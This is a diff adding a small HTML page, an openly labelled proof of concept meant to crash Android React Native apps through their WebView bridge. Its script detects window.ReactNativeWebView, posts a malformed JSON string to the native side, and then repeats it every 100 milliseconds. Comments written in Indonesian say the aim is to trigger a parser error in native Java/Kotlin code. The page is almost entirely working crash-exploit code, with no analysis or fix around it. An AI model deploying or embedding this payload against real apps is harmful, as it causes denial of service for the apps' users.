@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Android RN WebView Crash PoC</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background-color: black;
+      color: lime;
+      font-family: monospace;
+      padding: 2em;
+    }
+    h1 {
+      color: yellow;
+    }
+  </style>
+</head>
+<body>
+  <h1>Android RN WebView Crash</h1>
+  <pre id="log">Sending malformed payload...</pre>
+  <script>
+    const log = msg => document.getElementById("log").textContent += "\n" + msg;
+    try {
+      if (window.ReactNativeWebView) {
+        log("ReactNativeWebView detected.");
+
+        // Payload: JSON rusak yang bikin parser error di native Java/Kotlin
+        const payload = "{broken_json:";
+
+        // Kirim ke native
+        window.ReactNativeWebView.postMessage(payload);
+        log("Payload sent: " + payload);
+
+        // Spam payload untuk trigger lebih cepat
+        let i = 0;
+        setInterval(() => {
+          window.ReactNativeWebView.postMessage(payload);
+          i++;
+          log(`Spam #${i}`);
+        }, 100);
+        
+      } else {
+        log("ReactNativeWebView handler not found.");
+      }
+    } catch (e) {
+      log("JS Exception: " + e.message);
+    }
+  </script>
+</body>
+</html>
